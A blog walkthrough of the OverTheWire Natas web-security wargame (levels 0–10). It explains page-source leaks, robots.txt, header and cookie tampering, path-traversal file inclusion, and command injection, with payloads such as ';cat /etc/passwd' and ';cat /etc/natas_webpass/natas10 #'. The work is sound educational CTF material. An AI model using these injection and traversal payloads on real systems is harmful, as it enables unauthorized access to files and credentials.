+++
title = "OverTheWire - Natas"
date = "2024-12-31"
description = "Walkthrough for the Natas cyber wargame."

[extra]
show_only_description = true
toc = true

[taxonomies]
tags = ["ctf", "infosec", "wargame", "OverTheWire", "web"]
+++

## Introduction

The [Natas wargame](https://overthewire.org/wargames/natas/) is another[^1]
wargame hosted by OverTheWire. This one focuses on web security.

[^1]: See my writeups for the OverTheWire [Bandit](/articles/overthewirebandit) and
    [Leviathan](/articles/overthewireleviathan) wargames.

In this walkthrough I'm going to show the process for solving each challenge
and try to provide some insight into what each challenge is trying to teach
and why it's useful, so keep an eye out for callouts like those below.

{% callout(type="note") %}

Each Natas level is accessible via browser at the specified URL for the level.
For example, the level 0 url is:
[http://natas0.natas.labs.overthewire.org](http://natas0.natas.labs.overthewire.org).

{% end %}

{% callout(type="warning") %}

If you're looking for the solution of a particular level, you are highly
encouraged to attempt it on your own before following this walkthrough. You
will learn some useful things regardless, but attempting each level on your own
first will help the knowledge stick better. I promise.

{% end %}

## Prerequisites

The solutions for each level will be illustrated with numerous screenshots, so
you won't need any other tools to just read along. However, if you'd like to
have a better understanding of what's going and wish to follow along, you may
want to familiarize yourself with a few things.

1. The basics of HTML and PHP will be quite important. If you're familiar with
   another programming language you can probably follow along with any
challenges that require PHP without too much trouble though.
2. The browser dev tools. Specifically for Chrome/chromium browsers, though
   everything we do in this walkthrough should also be possible via the dev
tools for other browsers like Firefox, Opera, etc. If you'd like an intro check
out this [overview of the Chrome
devtools](https://developer.chrome.com/docs/devtools/overview)
3. Knowledge of HTTP will be essential for several levels and is somewhat of a
   prerequisite to effectively use the web proxies mentioned next.
4. A web proxy. [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) and
   PortSwigger's [Burp Suite](https://portswigger.net/burp/communitydownload)
are the most popular ones. Either will suffice but I'll be demoing the
solutions in this walkthrough with ZAP wherever a proxy is needed.

That's it. Enjoy the walkthrough!

## Walkthrough

### Level 0

Most of the levels of Natas begin with some kind of hint, links to other pages,
or an interactive form.

For example, the level 0 home page shows a hint.

![level 0 hint](/images/otw-natas/0_hint.png)

The first step in examining any web application should always include viewing
the source code. Use the keyboard shortcut `Ctrl-U` or right click the page and
select "View page source" to view the source code of the page. This will give
you insight into what content is on the page, what other resources are used by
the page like Javascript and CSS files and links to other resources available
on the website.

```html
<body>
<h1>natas0</h1>
<div id="content">
You can find the password for the next level on this page.

<!--The password for natas1 is REDACTED -->
</div>
</body>
```

The source code for the level 0 home page clearly shows the password for [level
1](#level-1) as an HTML comment.

While direct data disclosure on a web page like this isn't overly abundant, it
can still be found in the wild[^2] and should always be considered when
examining a web application for vulnerabilities.

[^2]: A relatively high-profile example of this sort of data disclosure
    occurred in 2021 where over 100,000 teachers' Social Security numbers of
were accessible by simply viewing the page source of a site hosted by the
[Missouri Department of Elementary and Secondary
Education](https://dese.mo.gov). See this [TechCrunch
article](https://techcrunch.com/2021/10/15/f12-isnt-hacking-missouri-governor-threatens-to-prosecute-local-journalist-for-finding-exposed-state-data/)
for more details.

### Level 1

This challenge is similar to the last one. The hint provided even mentions that
"rightclicking" is blocked now.

![level 1 hint](/images/otw-natas/1_hint.png)

To bypass this, the keyboard shortcut `Ctrl-U` mentioned earlier can be used to
view the source. Once again, the password is clearly shown in an HTML comment.

```html
<body oncontextmenu="javascript:alert('right clicking has been blocked!');return false;">
<h1>natas1</h1>
<div id="content">
You can find the password for the
next level on this page, but rightclicking has been blocked!

<!--The password for natas2 is REDACTED -->
</div>
</body>
```

### Level 2

Level 2 doesn't provide much information, but examining the page's source will
give some insight into solving this level.

![level 2 hint](/images/otw-natas/2_hint.png)

```html, linenos, hl_lines=4, linenostart=12
<h1>natas2</h1>
<div id="content">
There is nothing on this page
<img src="files/pixel.png">
</div>
```

In addition to the message stating there's nothing on this page, there is an
`<img>` tag linking to an image file at `/files/pixel.png`. Most importantly,
this link indicates some files are being served by the web server under the
`/files` directory.

Navigating to this endpoint at
`http://natas2.natas.labs.overthewire.org/files/` shows some interesting files.

![level 2 file directory](/images/otw-natas/2_files_dir.png)

Besides the image file, there is also a text file `users.txt`. This file
reveals the password for the next level.

![level 2 next password](/images/otw-natas/2_password.png)

This kind of vulnerability would most likely be classified as a [security
misconfiguration](https://owasp.org/Top10/A05_2021-Security_Misconfiguration/).
Clearly the `users.txt` should not be accessible. Access should be blocked by
the web server or at least restricted to particular users.

### Level 3

Once again, the home page doesn't reveal much at first glance. Let's look at
the source.

```html
<body>
<h1>natas3</h1>
<div id="content">
There is nothing on this page
<!-- No more information leaks!! Not even Google will find it this time... -->
</div>
</body>
```

This time, the HTML comment provides a subtle clue. It mentions that "[n]ot
even Google will find it" which is hinting at something called a
[`robots.txt`](https://en.wikipedia.org/wiki/Robots.txt) file which contains a
list of directories and files that should be ignored by web crawlers. Search
engines like Google and Bing use the `robots.txt` file to determine which files
and directories they shouldn't be indexing.

*robots.txt*
![level 3 robots.txt](/images/otw-natas/3_robots_txt.png)


In this case, there is only a single directory `/s3cr3t` being disallowed.
Navigating to that directory reveals a single file, `users.txt`.

![level 3 secret file](/images/otw-natas/3_s3cr3t.png)

View the `users.txt` file for the password to the next level.

{% callout(type="tip") %}

Looking at the `robots.txt` is a common step taken by attackers when performing
reconnaissance on a web application since it can sometimes reveal locations
that the developers have deemed sensitive enough to exclude from search
indexing.

{% end %}

### Level 4

Level 4 is the first challenge we've seen that can't simply be solved by
examining the page source or navigating to some specific endpoint.

![level 4 hint](/images/otw-natas/4_hint.png)

If you aren't familiar with HTTP, there are some excellent [guides on
HTTP](https://developer.mozilla.org/en-US/docs/Web/HTTP) available in the [MDN
Web Docs](https://developer.mozilla.org/en-US/).

Essentially every[^3] request by the browser uses HTTP. Fortunately the dev
tools have a convenient interface for examining the HTTP requests made by the
browser. These requests can be viewed in the Network tab of the browser dev
tools. There's a bunch of cool stuff you can do with the network tab, but for
this challenge we're only interested in that highlighted request to `index.php`,
which is the home page for level 4.

[^3]: Not __every__ request made by a browser is strictly over HTTP or HTTPS,
    but it is the most common and is the only protocol that's essential to
understand for the Natas wargame.

Here's the network tab after loading the level 4 home page.
![level 4 dev tools network tab](/images/otw-natas/4_dev_tools_network.png)

Click on that `index.php` to view more information about the request like the
request's headers.

![level 4 network tab index.php](/images/otw-natas/4_network_index_php.png)

The message on the home page hints that authorized users "come from" the URL
`http://natas5.natas.labs.overthewire.org/`. The key is recognizing that there
is an HTTP header that's used to convey this information from the client to the
web server.

Unfortunately, at the time of this writing, the request headers can't be easily
edited in the browser. Instead we'll need to use another tool to craft an HTTP
request with the appropriate header to convince the web server that we're a user
from `http://natas5.natas.labs.overthewire.org`.

This is where knowledge of HTTP is essential, because you have to recognize
that we're looking for the Referer[^4] HTTP header which is used to indicate the
source of a request.

[^4]: Yes the correct spelling should be "Referrer", however the header
was misspelled in the original HTTP specification, [RFC 1945](https://
www.rfc-editor.org/rfc/rfc1945#section-10.13), so it remains misspelled for
compatibility.

As I mentioned before, the browser doesn't allow for modifying request headers,
so we'll need to use a different tool. The simplest will be to use a command
line tool like [curl](https://curl.se), though a web proxy like ZAP or Burp
Suite will work just as well.

`curl` is a program for transferring data to or from a server using URLs. We'll
just be using it with HTTP, but it supports other protocols too. If you'd like
to dig into the capabilities of curl, I'd recommend reading through the
[Everything curl](https://everything.curl.dev) guide, but, if you're in a
hurry, the browser dev tools have a convenient feature to construct a web
request in the curl format from the Network tab.

Just right-click on the request and click "Copy as cURL" under the "Copy"
menu.

![level 4 copy as curl](/images/otw-natas/4_copy_as_curl.png)

Paste the command into the terminal or a text editor and it should look
something like this.

```
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Authorization: Basic [REDACTED]' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  --insecure
```

Each argument to the `-H` flag is an HTTP header. Now, just add an argument for
the Referer header with the correct value as mentioned in the message on the
home page.

```hl_lines=8
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Accept-Language: en-US,en;q=0.9' \
  -H 'Authorization: Basic [REDACTED]' \
  -H 'Cache-Control: no-cache' \
  -H 'Connection: keep-alive' \
  -H 'Pragma: no-cache' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
  --insecure
```

Be sure to keep the original `Authorization` header from your own HTTP request.
It's required to handle the [Basic
authentication](https://developer.mozilla.org/en-US/docs/Web/HTTP/Authentication#the_general_http_authentication_framework)
that was previously handled by the browser.

Alternatively you can provide the credentials with the `-u` flag like so.
Replacing `REDACTED` with the level 4 password you used to access this level.

```hl_lines=2
curl -H 'Referer: http://natas5.natas.labs.overthewire.org/' \
     -u natas4:REDACTED \
     http://natas4.natas.labs.overthewire.org
```

The `curl` response should contain the following body with the password to the
next level.

```html, hl_lines=15, linenostart=20
<body>
<h1>natas4</h1>
<div id="content">

Access granted. The password for natas5 is [REDACTED]
<br/>
<div id="viewsource"><a href="index.php">Refresh page</a></div>
</div>
</body>
```

{% callout(type="tip") %}

HTTP headers are useful for a lot of things, but be cautious. Using them
incorrectly for authentication as the `Referer` header is used in this
challenge can lead [all
kinds](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
of security vulnerabilities.

{% end %}

### Level 5

The level 5 message is a bit more cryptic than the previous levels, but it does
give us a place to start.

![level 5 hint](/images/otw-natas/5_hint.png)

First identify what mechanisms may be used for tracking the login state
of a user. [Stateless
protocols](https://en.wikipedia.org/wiki/Stateless_protocol) like HTTP cannot
retain session state between requests and must instead work around that
limitation with some kind of session management mechanism. In the case of HTTP
this is most often handled with [HTTP
cookies](https://en.wikipedia.org/wiki/HTTP_cookie).


Under the Application tab of the browser dev tools you should find a list of
storage options available to the browser, including any HTTP cookies.

In this case there's a single cookie labeled `loggedin` from the `natas5`
domain. It's set to `0`. Try changing the value to `1`.

![level 5 cookie](/images/otw-natas/5_cookie1.png)

Reloading the page should yield a message of "Access granted" with the password
to the next level.

![level 5 password](/images/otw-natas/5_password.png)

{% callout(type="tip") %}

Cookies can, in fact, be used for secure session management. But not like this.

{% end %}

### Level 6

This level doesn't give any message. Just an input form and a link to "View
sourcecode"

![level 6 hint](/images/otw-natas/6_hint_source_button.png)

The "View sourcecode" link doesn't show the client-side source. It actually
shows the code as it exists on the server.

The critical section below shows how PHP will render the page based on `secret`
POST parameter which is set by the form and checked against the `$secret`
variable.

```php, linenos, hl_lines=5
<?
include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

Also note the `include` statement which references a file at
`includes/secret.inc`. Navigating to that location shows the following PHP file
where the `$secret` variable is defined.

```php
<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>
```

Entering the secret defined in `includes/secret.inc` into the form will return
the password for level 7.

### Level 7

This level actually has multiple pages.

*Home page*
![level 7 home page](/images/otw-natas/7_home.png)

*About page*
![level 7 about page](/images/otw-natas/7_about.png)

The page source contains a useful hint.

```html, hl_lines=10
<body>
<h1>natas7</h1>
<div id="content">

<a href="index.php?page=home">Home</a>
<a href="index.php?page=about">About</a>
<br>
<br>

<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
</div>
</body>
```

The most important thing to notice in this source code is that the "Home" and
"About" links are specifying their target pages via query parameters. As
always, when performing a web application test, it's important to examine any
entry point for user input.

The combination of the mentioned links and the hint provided should lead you to
investigate for any [local file inclusion
(LFI)](https://en.wikipedia.org/wiki/File_inclusion_vulnerability#Local_file_inclusion(LFI))
vulnerabilities.

Modify the `page` query parameter to reference the level 8 password file like so.
```
http://natas7.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8`
```

Note the several doubled dots `../` chained together to backtrack the current
directory to the root of the file system before continuing to the password
directory at `/etc/natas_webpass/` as mentioned by the hint.

### Level 8

Similar to [level 6](#level-6), the main page of level 8 contains an input text
field and a link to the server-side source code. However, this time the
encoding of the secret is a bit more complicated.

```php, linenos, hl_lines=10
<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

<form method=post>
Input secret: <input name=secret><br>
<input type=submit name=submit>
</form>
```

The php script has an `$encodedSecret` variable which is checked before
granting access to the next password. The `encodeSecret` function encodes the
`$secret` variable into base64, reverses the string, and converts the ASCII
string to hex. The encoding algorithm could be reversed with any programming
language, but PHP has functions available to easily reverse them all.

|PHP function|Description|
|------------|-----------|
|[hex2bin](https://www.php.net/manual/en/function.hex2bin.php)|decodes a hexadecimally encoded binary string|
|[strrev](https://www.php.net/manual/en/function.strrev.php)|reverse a string|
|[base64_decode](https://www.php.net/manual/en/function.base64-decode.php)|decodes data encoded with MIME base64|

The encoding can be reversed with the following PHP script.

```php, linenos
<?php 
      $res = hex2bin("3d3d516343746d4d6d6c315669563362");
      echo "$res\n";
      $res = strrev($res);
      echo "$res\n";
      $res = base64_decode($res);
      echo "$res\n";
?> 
```

{% callout(type="note") %}

If you don't have PHP installed on your system, the script can be executed on
an online platform like [repl.it](https://replit.com/languages/PHP). Otherwise,
save the script locally and execute it with `php -f script.php`.

{% end %}

Enter the decoded secret into the form to get the password to the next level.

### Level 9

Level 9 is a bit different than anything we've seen so far. It contains a form
that accepts an input to search a dictionary for words that match.

*Empty search input*
![level 9 search password](/images/otw-natas/9_search_password.png)

*Search for the string 'hack'*
![level 9 search password hack](/images/otw-natas/9_search_password_hack.png)

Similar to the previous challenges though, we have a link to the PHP source
code.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    passthru("grep -i $key dictionary.txt");
}
?>
```

One thing we should take note of is the
[passthru](https://www.php.net/manual/en/function.passthru.php) function which
executes an external program as if it was run from the command line. We can see
`passthru` is being used to execute the `grep` command on a file called
`dictionary.txt`. Download that file and see what it contains. As you might
have suspected, it's a list of words, and it's sorted alphabetically. A quick
scan of the file doesn't reveal any unusual entries. There are a few with
diacritics and accent marks, but that is it.

Instead let's focus on `$key`. It's being passed directly into the `passthru`
function without any sanitization, essentially giving us complete control over
the command being executed by the server.

Here are a few possible payloads. Note the leading `;` which is used by Bash to
indicate the end of a line allowing us to insert a new command like `cat`.

```bash
# this payload outputs the entire dictionary.txt instead of just the grepped lines
;cat

# this payload outputs the /etc/passwd file in addition to dictionary.txt
;cat /etc/passwd

# this payload outputs the natas 10 password in addition to dictionary.txt
;cat /etc/natas_webpass/natas10

# this outputs ONLY the natas 10 password
# The trailing '#' marks the remainder of the line as a comment
# which prevents the dictionary.txt from being output
;cat /etc/natas_webpass/natas10 #
```

Using `;cat /etc/natas_webpass/natas10 #` as a payload returns the contents of
the `natas10` password file.

![level 9 password](/images/otw-natas/9_password.png)

{% callout(type="tip") %}

This type of attack falls under the
[Injection](https://owasp.org/Top10/A03_2021-Injection/) category of the [OWASP
Top 10 (2021)](https://owasp.org/www-project-top-ten/). Specifically it's a
command injection vulnerability and is a concern whenever user input is passed
to an execution environment such as Bash as it's done in this level.

{% end %}

### Level 10

The front page for level 10 is the same as [level 9](#level-9) with some slight
changes in the source code.

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

In this iteration of the word search form, a call to
[`preg_match`](https://www.php.net/manual/en/function.preg-match.php) is used
to catch the `;`, `|`, and `&` symbols, so it won't be possible to simply
prefix the command with `;` like we did before.

Fortunately for us, this was a naive approach to sanitize inputs. The search
input is still passed into the `grep` command which can take multiple
arguments. So files can still be searched even if they can't be directly output
with the `cat` command.

This payload should do the trick: `".*" /etc/natas_webpass/natas11 #`. This
payload makes the `grep` command return every line in the `natas11` password
file and comments out the `dictionary.txt` argument with `#` just like in [level 9](#level-9).

![level 10 password](/images/otw-natas/10_password.png)

## To be continued

{% callout(type="note") %}

I hope you enjoyed the walkthrough. When time permits, I intend to expand this
post to include every level of OverTheWire Natas.

Happy hacking!
{% end %}
